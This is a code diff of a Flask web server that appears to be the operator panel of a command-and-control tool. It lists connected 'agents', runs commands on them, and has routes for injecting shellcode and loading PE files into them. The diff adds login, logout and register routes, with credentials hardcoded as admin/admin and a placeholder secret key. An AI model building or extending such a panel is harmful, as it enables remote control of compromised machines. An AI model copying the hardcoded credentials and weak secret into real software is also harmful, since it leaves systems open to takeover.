@@ -1,19 +1,23 @@
-from concurrent.futures import thread
+
 from gzip import READ
 import time,datetime
 from os import close
 import os,ctypes
-from PIL import ImageTk,Image  
-from tkinter import *
+ 
 import re
-import socket,tkinter
+import socket
 import threading,time,flask
 from flask import *
 from pathlib import Path
 import base64
 import time,random,string 
 import zipfile
-import webbrowser,PIL
+from flask_wtf import FlaskForm
+from wtforms import StringField
+from MyForms import *
+from flask_session import Session
+from flask_sqlalchemy import SQLAlchemy
+from Checks import *
 
 ip_address = '0.0.0.0'
 port_number = 1234
@@ -52,6 +56,12 @@ for i in range(50):
     LOAD_OUTPUT.append('')
 
 app = Flask(__name__)
+app.secret_key = 'blahblahblah'
+app.config['SESSION_PERMANENT'] = False
+app.config["SESSION_TYPE"]="filesystem"
+app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///databases/main.db"
+Session(app)
+db = SQLAlchemy(app)
 
 def close_connection(connection,thread_index):
     connection.close() 
@@ -300,17 +310,23 @@ def home():
 
 @app.route("/agents")
 def agents():
+    print(session)
+    if "name" not in session.keys():
+        return redirect("/home")
     #print(THREADS)
     return render_template('agents.html',threads=THREADS,ips=IPS)
 
 
 @app.route("/<agentname>/executecmd")
 def executecmd(agentname):
-    return render_template("execute.html",name=agentname)
+    command = Command()
+    return render_template("execute.html",name=agentname,command =command)
 
 
 @app.route("/<agentname>/execute",methods=['GET','POST'])
 def execute(agentname):
+    command = Command()
+    
     if request.method=='GET':
         counter = 0
         cmd = request.args.get('d')
@@ -327,7 +343,7 @@ def execute(agentname):
             CMD_OUTPUT[req_index]="Trying to initiate transfer... If you get incorrect or less data, run it again"
             #time.sleep(3)
             cmdoutput = CMD_OUTPUT[req_index]
-            return render_template("execute.html",name=agentname,cmdoutput=cmdoutput)
+            return render_template("execute.html",name=agentname,cmdoutput=cmdoutput,command=command)
         #time.sleep(5)
         if cmd=="powerup":
             time.sleep(20)
@@ -339,7 +355,7 @@ def execute(agentname):
             #counter = 0
         cmdoutput = CMD_OUTPUT[req_index]
         #print("Latest value->"+cmdoutput)
-        return render_template("execute.html",name=agentname,cmdoutput=cmdoutput)
+        return render_template("execute.html",name=agentname,cmdoutput=cmdoutput,command=command)
     if request.method=='POST':
         cmd = request.form['command']
         counter = 0
@@ -578,6 +594,8 @@ def injectshellcode(agentname):
     print("hi")
     #pass'''
 
+
+
 @app.route("/<agentname>/LoadPE64",methods=["GET","POST"])
 def loadpe64(agentname):
     for i in THREADS:
@@ -588,6 +606,48 @@ def loadpe64(agentname):
         LOAD_INPUT[req_index] = "loadpe64-"+filename
     cmdoutput = CMD_OUTPUT[req_index]
     return render_template("loadassembly.html",cmdoutput=cmdoutput,agentname=agentname)
+
+
+
+@app.route("/login",methods=["GET","POST"])
+def login():
+    #if session['name']:
+        #return redirect('/home')
+    if request.method=="POST":
+        username = request.form.get('username')
+        password = request.form.get('password')
+        if username=="admin" and password=="admin":
+            session['name']="admin"
+            return redirect("/home")
+        else:
+            status = "Invalid Credentials"
+            loginform = Login()
+            return render_template("login.html",form=loginform,status=status)  
+    loginform = Login()
+    
+    return render_template("login.html",form=loginform)
+
+
+@app.route("/logout")
+def logout():
+    session.pop('name')
+    #session.clear()
+    return redirect("/home")
+
+
+@app.route("/register",methods=["GET","POST"])
+def register():
+    
+    if request.method=="POST":
+        registerform = Register()
+        username = request.form.get('username')
+        email = request.form.get('email')
+        password = request.form.get('password')
+        confirm_password = request.form.get('confirm_password')
+        status = Validate(username,email,password,confirm_password)
+        return render_template("register.html",regform=registerform,status=status)
+    registerform = Register()
+    return render_template("register.html",regform=registerform)
 
 
 @app.route("/misc")
